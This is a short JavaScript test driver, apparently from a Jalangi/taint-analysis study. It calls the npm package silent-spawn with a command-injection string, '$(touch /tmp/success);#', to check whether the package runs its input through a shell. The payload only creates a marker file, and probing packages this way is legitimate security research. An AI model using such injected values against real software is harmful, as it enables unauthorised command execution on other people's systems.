// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/silent-spawn/node_modules/silent-spawn');
try {
	var x0 = " $(touch /tmp/success);#";
var x1 = {};
var x2 = {};
new PUT(x0,x1,x2)();
} catch (e) {
	console.log(e);
}